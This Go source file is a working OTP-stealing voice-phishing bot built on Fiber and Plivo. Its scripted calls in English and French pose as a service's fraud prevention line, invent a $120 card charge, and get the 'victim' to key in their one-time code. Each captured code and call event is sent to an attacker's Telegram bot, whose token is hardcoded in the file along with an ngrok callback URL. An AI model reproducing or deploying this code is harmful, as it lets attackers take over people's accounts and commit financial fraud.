package main

import (
	"fmt"
	"net/url"

	"github.com/gofiber/fiber/v2"
	"github.com/imroc/req"
	"github.com/plivo/plivo-go/xml"
)

var NGROK_URL string = "http://bbae-136-175-8-172.ngrok.io"

func main() {

	app := fiber.New()

	app.Post("/detect_dtmf/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("📲 OTP Code Grabbed!: %v", c.FormValue("Digits"))
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		response := xml.ResponseElement{
			Contents: []interface{}{

				new(xml.SpeakElement).
					AddSpeak(fmt.Sprintf("Please wait as we further verify the OTP code.")),

				new(xml.PlayElement).
					SetContents("https://cdn.discordapp.com/attachments/896735028162207754/897578055420243978/yt5s.com_-_Opus_Number_1_-_The_Famous_Phone_Hold_Music_128_kbps-AudioTrimmer.com_1.mp3"),
				new(xml.WaitElement).
					SetLength(3),
				new(xml.SpeakElement).
					AddSpeak(fmt.Sprintf("We have verified the code and secured your account . Thank you %v for choosing us %v", c.Params("victim_name"), c.Params("service_name"))),
			},
		}
		return c.SendString(response.String())
	})

	app.Get("/generate_xml/:user/:victim_name/:service_name/:mes_id/", func(c *fiber.Ctx) error {
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.GetInputElement).
					SetAction(fmt.Sprintf("%v/request_otp/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
					SetMethod("POST").
					SetInputType("dtmf").
					SetNumDigits(3).
					SetDigitEndTimeout(3).
					SetRedirect(true).
					SetContents([]interface{}{
						new(xml.SpeakElement).
							AddSpeak(fmt.Sprintf("Hello  %v  we are calling from  %v  fraud prevention line  , We are calling to inform you that your credit card was used for 120 dollar online payment today , If it's not you , press 1", c.Params("victim_name"), c.Params("service_name"))).
							SetLanguageVoice("en-US", "WOMAN").
							SetLoop(1)}),
			},
		}
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape("On Call🤳"))
		go req.Get(webhook_url)
		return c.SendString(response.String())
	})

	app.Post("/request_otp/:user/:mes_id/", func(c *fiber.Ctx) error {
		digit := c.FormValue("Digits")
		if digit == "1" {
			response := xml.ResponseElement{
				Contents: []interface{}{

					new(xml.GetInputElement).
						SetAction(fmt.Sprintf("%v/detect_dtmf/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
						SetMethod("POST").
						SetInputType("dtmf").
						SetDigitEndTimeout(3).
						SetRedirect(true).
						SetContents([]interface{}{
							new(xml.SpeakElement).AddSpeak(" We need to confirm your identity first , Our system sent you an OTP code to your phone number type it here to block this payment").
								SetLanguageVoice("en-US", "WOMAN").
								SetLoop(4)}),
				},
			}
			mess := fmt.Sprintf("Victim clicked on 1. otp on the way 🤳 ")
			webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(mess))
			go req.Get(webhook_url)
			return c.SendString(response.String())

		}
		return c.SendString("done")
	})

	app.Post("/hangup/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Call Ended")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/sendMessage?chat_id=%v&text=%v", c.Params("user"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/ring/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Ringing🤳")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/machine/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Voice Mail")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})
	//france
	app.Post("/detect_fr_dtmf/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("📲 OTP Code Grapped!: %v", c.FormValue("Digits"))
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		response := xml.ResponseElement{
			Contents: []interface{}{

				new(xml.SpeakElement).
					AddSpeak(fmt.Sprintf("attend.")),

				new(xml.PlayElement).
					SetContents("https://cdn.discordapp.com/attachments/896735028162207754/897578055420243978/yt5s.com_-_Opus_Number_1_-_The_Famous_Phone_Hold_Music_128_kbps-AudioTrimmer.com_1.mp3"),
				new(xml.WaitElement).
					SetLength(2),

				new(xml.SpeakElement).
					AddSpeak(fmt.Sprintf("Merci %v de nous avoir choisi %v", c.Params("victim_name"), c.Params("service_name"))),
			},
		}
		return c.SendString(response.String())
	})

	app.Get("/generate_fr_xml/:user/:victim_name/:service_name/:mes_id/", func(c *fiber.Ctx) error {
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.GetInputElement).
					SetAction(fmt.Sprintf("%v/request_fr_otp/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
					SetMethod("POST").
					SetInputType("dtmf").
					SetNumDigits(3).
					SetDigitEndTimeout(3).
					SetRedirect(true).
					SetContents([]interface{}{
						new(xml.SpeakElement).
							AddSpeak(fmt.Sprintf("Bonjour %v, nous appelons de la ligne de prévention de la fraude de %v, nous vous appelons pour vous informer que votre carte de crédit a été utilisée pour un paiement en ligne de 120 dollars aujourd'hui, si ce n'est pas vous, appuyez sur 1", c.Params("victim_name"), c.Params("service_name"))).
							SetLanguageVoice("fr-FR", "WOMAN").
							SetLoop(1)}),
			},
		}
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape("On Call🤳"))
		go req.Get(webhook_url)
		return c.SendString(response.String())
	})

	app.Post("/request_fr_otp/:user/:mes_id/", func(c *fiber.Ctx) error {
		digit := c.FormValue("Digits")
		if digit == "1" {
			response := xml.ResponseElement{
				Contents: []interface{}{

					new(xml.GetInputElement).
						SetAction(fmt.Sprintf("%v/detect_fr_dtmf/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
						SetMethod("POST").
						SetInputType("dtmf").
						SetDigitEndTimeout(3).
						SetRedirect(true).
						SetContents([]interface{}{
							new(xml.SpeakElement).AddSpeak("Nous devons d'abord confirmer votre identité. Notre système vous a envoyé un code OTP à votre numéro de téléphone, saisissez-le ici pour bloquer ce paiement.").
								SetLanguageVoice("fr-FR", "WOMAN").
								SetLoop(4)}),
				},
			}

			mess := fmt.Sprintf("Victim clicked on 1. otp on the way 🤳 ")
			webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(mess))
			go req.Get(webhook_url)
			return c.SendString(response.String())

		}
		return c.SendString("done")
	})

	app.Post("/hangup_fr/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("🤳 Call Ended")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/sendMessage?chat_id=%v&text=%v", c.Params("user"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/ring_fr/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Ringing🤳")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/machine_fr/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Voice Mail")
		webhook_url := fmt.Sprintf("https://api.telegram.org/bot2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Listen(":3000")
}
